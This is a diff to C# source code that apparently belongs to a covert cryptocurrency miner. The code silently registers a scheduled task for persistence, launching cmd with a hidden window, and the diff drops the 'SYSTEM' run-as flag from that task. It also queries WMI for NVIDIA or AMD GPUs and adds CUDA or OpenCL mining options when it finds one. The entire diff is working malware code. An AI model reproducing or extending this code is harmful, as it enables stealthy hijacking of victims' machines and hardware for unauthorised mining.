@@ -47,7 +47,7 @@ public partial class RProgram
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = "cmd",
-                        Arguments = RGetString("#TASKSCH") + "\"" + Path.GetFileNameWithoutExtension(rplp) + "\"" + " /tr " + "'" + "\"" + (rplp) + "\"" + "' /RU \"SYSTEM\" & exit",
+                        Arguments = RGetString("#TASKSCH") + "\"" + Path.GetFileNameWithoutExtension(rplp) + "\"" + " /tr " + "'" + "\"" + (rplp) + "\"" + "' & exit",
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true
                     });
@@ -198,7 +198,7 @@ public partial class RProgram
             try
             {
                 string GPUstr = RGetGPU();
-                if (GPUstr.ToLower().Contains("nvidia") || GPUstr.ToLower().Contains("amd"))
+                if (GPUstr.Contains("nvidia") || GPUstr.Contains("amd"))
                 {
                     try
                     {
@@ -241,12 +241,12 @@ public partial class RProgram
                                 }
                             }
 
-                            if (GPUstr.ToLower().Contains("nvidia"))
+                            if (GPUstr.Contains("nvidia"))
                             {
                                 rS += " --cuda --cuda-loader=" + "\"" + rbD + "ddb64.dll" + "\"";
                             }
 
-                            if (GPUstr.ToLower().Contains("amd"))
+                            if (GPUstr.Contains("amd"))
                             {
                                 rS += " --opencl ";
                             }
@@ -360,31 +360,22 @@ public partial class RProgram
     {
         try
         {
-            string VideoCard = "";
+            string gpu = "";
 
             var options = new ConnectionOptions();
             options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
+            var scope = new ManagementScope(@"\root\cimv2", options);
             scope.Connect();
 
-            var query = new ObjectQuery("SELECT * FROM Win32_VideoController");
+            var query = new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController");
             var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
             var managementObjectCollection = managementObjectSearcher.Get();
             foreach (ManagementObject MemObj in managementObjectCollection)
-                VideoCard = VideoCard + MemObj["VideoProcessor"] + " ";
-            if (VideoCard.ToLower().Contains("nvidia") || VideoCard.ToLower().Contains("amd"))
             {
-                return VideoCard;
+                gpu += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
             }
 
-            foreach (ManagementObject MemObj in managementObjectCollection)
-                VideoCard = VideoCard + MemObj["Name"] + " ";
-            if (VideoCard.ToLower().Contains("nvidia") || VideoCard.ToLower().Contains("amd"))
-            {
-                return VideoCard;
-            }
-
-            return "";
+            return gpu;
         }
         catch (Exception ex)
         {
